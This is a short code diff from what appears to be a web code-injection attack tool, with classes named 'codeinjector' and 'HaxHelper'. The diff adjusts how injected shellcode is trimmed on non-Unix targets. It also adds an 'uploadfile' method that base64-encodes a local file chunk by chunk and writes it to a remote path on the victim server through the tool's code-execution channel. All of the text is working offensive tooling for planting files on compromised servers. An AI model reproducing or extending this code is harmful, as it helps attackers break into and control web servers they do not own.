@@ -64,7 +64,7 @@ class codeinjector(baseClass):
         language = vuln.getAttribute("language")
         isUnix = vuln.getAttribute("os") == "unix"
         
-        if (not isUnix):
+        if (not isUnix and shcode[1]==":"):
             shcode = shcode[3:]
         
         xml2config = self.config["XML2CONFIG"]
@@ -641,4 +641,26 @@ class HaxHelper:
     def getUNAMECommand(self):
         """ Get a system-command which tells us the kernel version. """
         return(self.generic_lang.getKernelCode(self.isunix))    
-        
+    
+    def uploadfile(self, lfile, rfile, chunksize=2048):
+        ret = 0
+        f = open(lfile, "rb")
+        while 1==1:
+            data = None
+            if (chunksize == -1):
+                data = f.read()
+            else:
+                data = f.read(chunksize)
+                
+            if (data != ""):
+                bdata = base64.b64encode(data)
+                code = self.langClass.generateWriteFileCode(rfile, "a", bdata)
+                html = self.executeCode(code)
+                if (html == "FAILED"):
+                    break
+                else:
+                    ret = ret + len(data)
+            else:
+                break
+        f.close()
+        return(ret)
